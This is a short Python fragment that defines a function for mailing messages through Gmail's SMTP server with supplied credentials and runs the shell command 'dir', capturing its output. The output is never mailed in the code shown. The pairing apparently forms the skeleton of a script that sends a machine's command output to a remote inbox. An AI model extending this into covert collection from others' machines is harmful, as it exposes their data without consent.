import subprocess, smtplib

def sendMail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "dir"
result = subprocess.check_output(command, shell=True)